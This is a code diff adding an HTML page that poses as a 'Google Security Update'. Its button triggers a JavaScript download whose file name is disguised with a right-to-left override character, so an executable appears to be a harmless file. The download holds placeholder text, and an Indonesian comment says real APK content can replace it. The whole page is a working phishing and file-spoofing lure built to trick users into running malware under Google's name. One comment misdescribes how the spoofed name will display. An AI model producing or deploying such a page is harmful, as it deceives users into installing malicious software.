@@ -1,0 +1,31 @@
+<html>
+<head>
+    <title>Google Security Update</title>
+</head>
+<body>
+    <button onclick="downloadSpoofedFile()">Install Google Security Update</button>
+
+    <script>
+        function downloadSpoofedFile() {
+            // Buat blob dengan content file (bisa diganti dengan konten APK asli)
+            const fileContent = "Ini adalah file executable palsu";
+            const blob = new Blob([fileContent], { type: "application/octet-stream" });
+            const url = URL.createObjectURL(blob);
+
+            // Buat nama file dengan RTLO spoofing
+            // Akan terlihat seperti: "Google_Updatepdf.exe"
+            const spoofedName = "Google_Update\u202Efdp.exe";
+
+            // Buat element download
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = spoofedName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            URL.revokeObjectURL(url);
+        }
+    </script>
+</body>
+</html>
